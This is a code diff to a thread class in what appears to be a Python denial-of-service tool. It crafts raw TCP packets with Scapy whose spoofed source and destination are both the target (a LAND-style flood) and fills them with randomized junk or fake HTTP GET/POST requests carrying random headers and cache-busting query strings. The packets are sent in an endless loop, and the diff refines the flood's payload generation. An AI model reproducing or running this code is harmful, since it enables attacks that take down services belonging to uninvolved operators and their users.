@@ -1855,61 +1855,63 @@ class ln(threading.Thread):
  def run(self):
   global counter
   while (stop!=True):
-   if winds=='null':
-     windf=0
-   if winds=="random":
-     windf=random.randint(0,65535)
    try:
-    if tcpf==True:
-     msg=''
-     req='TCP'
-     for x in range(random.randint(1*amp,3*amp)):
-      msg+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
-     if len(msg)>1400:
-      msg=msg[0:1400]
-    else:
-     pths=random.choice(paths)
-     for l in range(random.randint(1,5)):
-      ed=random.choice(ec)
-      oi=random.randint(1,3)
-      if oi==2:
-       gy=0
-       while gy<1:
-         df=random.choice(ec)
-         if df!=ed:
-          gy+=1
-       ed+=', '
-       ed+=df
-      l=random.choice(al)
-      for n in range(random.randint(0,5)):
-       l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
-      kl=random.randint(1,2)
-      if kl==1:
-       req="GET"
-       msg='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths,random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
-      else:
-       req="POST"
-       k=''
-       for _ in range(1,random.randint(2,5)):
-        k+=random.choice(lis)
-       k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
-       for _ in range(1,random.randint(1,3)):
-        k+=random.choice(lis)
-       j=''
-       for x in range(0,random.randint(11,31)):
-        j+=random.choice(lis)
-       par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
-       msg= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths,random.choice(ua),l,random.randint(300,1000),len(par),target,par)
+    if winds=='null':
+     windf=0
+    if winds=="random":
+     windf=random.randint(0,65535)
     if paylo==False:
-     msg=''
-    packet = IP(ttl=random.randint(minttl,maxttl),src=target, dst=target)/TCP(window=windf,sport=port,dport=port)/msg
+     urd=''
+     req='None'
+    else:
+     if tcpf==True:
+      urd=''
+      req='TCP'
+      for x in range(random.randint(1*amp,3*amp)):
+       urd+=str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)+str(random.randint(0,1000000))+random.choice(lis)
+      if len(urd)>1400:
+       urd=urd[0:1400]
+     else:
+      pths=random.choice(paths)
+      for l in range(random.randint(1,5)):
+       ed=random.choice(ec)
+       oi=random.randint(1,3)
+       if oi==2:
+        gy=0
+        while gy<1:
+          df=random.choice(ec)
+          if df!=ed:
+           gy+=1
+        ed+=', '
+        ed+=df
+       l=random.choice(al)
+       for n in range(random.randint(0,5)):
+        l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
+       kl=random.randint(1,2)
+       if kl==1:
+        req="GET"
+        urd='GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nHost: {}\r\n\r\n'.format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),target)
+       else:
+        req="POST"
+        k=''
+        for _ in range(1,random.randint(2,5)):
+         k+=random.choice(lis)
+        k+=str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
+        for _ in range(1,random.randint(1,3)):
+         k+=random.choice(lis)
+        j=''
+        for x in range(0,random.randint(11,31)):
+         j+=random.choice(lis)
+        par =(k*random.randint(3,5))+str(random.randint(1,100000))+'='+(j*random.randint(20,30))+str(random.randint(1,10000))+random.choice(lis)+random.choice(lis)
+        urd= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pths+'?'+str(random.randint(0,100000000))+random.choice(lis)+str(random.randint(0,100000000)),random.choice(ua),l,random.randint(300,1000),len(par),target,par)
+    packet = IP(ttl=random.randint(minttl,maxttl),src=target, dst=target)/TCP(window=windf,sport=port,dport=port)/urd
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=bytes(packet)
     s.sendto(packet,(target,port))
     counter+=1
     if prints==True:
-     print("[!]Packets: {} | Type: {} | Bytes: {}".format(counter,req,len(packet)))
+     print("[!]Packets: {} | Type: {} | Bytes: {}".format(counter,req,len(urd)))
     time.sleep(.1)
    except Exception as e:
     pass
